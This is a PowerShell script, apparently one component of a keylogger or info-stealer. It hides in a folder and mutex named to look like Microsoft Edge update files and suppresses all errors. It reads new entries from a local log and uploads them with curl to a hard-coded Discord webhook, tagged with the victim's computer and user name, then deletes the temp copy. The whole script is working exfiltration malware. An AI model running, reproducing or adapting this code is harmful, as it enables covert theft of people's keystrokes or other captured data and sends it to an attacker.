$ErrorActionPreference = "SilentlyContinue"
$hook = "https://discord.com/api/webhooks/1574502039323545742/FGJ91Pysy7zdQwD64rLOfrSyMa9-c5o-g8_29n5sEqzLr2KS96o9sWrPx5Zp7uY3ukUt"
$dir  = "$env:LOCALAPPDATA\Microsoft\EdgeUpdateCore"
$log  = "$dir\d.log"; $posF = "$dir\p.txt"

$mtx = New-Object Threading.Mutex($false, "EdgeUpdSendMtx")
if (-not $mtx.WaitOne(4000)) { exit }

if (-not (Test-Path $log)) { exit }
$pos = 0; if (Test-Path $posF) { $pos = [int](Get-Content $posF) }
$a = Get-Content $log -Raw
if (-not $a) { exit }
if ($pos -gt $a.Length) { $pos = 0 }
if ($a.Length -le $pos) { exit }

$f = "$env:TEMP\e_$(Get-Date -f yyyyMMdd_HHmmss).txt"
$a.Substring($pos) | Set-Content $f -Encoding UTF8
curl.exe -s -f -F "content=**sessao** $env:COMPUTERNAME / $env:USERNAME" -F "files[0]=@$f" $hook
if ($LASTEXITCODE -eq 0) { Set-Content $posF $a.Length }
Remove-Item $f -ErrorAction SilentlyContinue
